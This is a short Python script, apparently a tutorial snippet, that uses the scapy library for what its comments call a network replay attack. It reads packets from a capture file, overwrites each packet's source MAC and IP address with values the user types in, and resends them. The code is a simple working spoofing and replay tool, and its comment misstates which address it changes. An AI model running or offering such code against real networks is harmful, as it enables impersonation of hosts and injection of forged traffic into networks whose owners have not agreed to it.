

# python code using scapy framework to perform a sample network replay attack 
# the aim of the code is to alter the original parameters in the .pcap file with the attacker's own parameters like \
# mac address and dstination ip address etc .. 

import time
from scapy.all import*

pcap_file = raw_input("your packt capture file name here")
packets = rdpcap(pcap_file)

c_mac = raw_input("Eter the altered /new mac address")
c_source = raw_input("Enter the altered /new ip address")

for packet in packets:
    packet[Ether].src = c_mac
    packet[IP].src = c_source 
    
    send(packet)
      
      
# this is just short piece of code to alter the pcap file and perform the replay attack 
# more possibilities are there for varoius alterations 
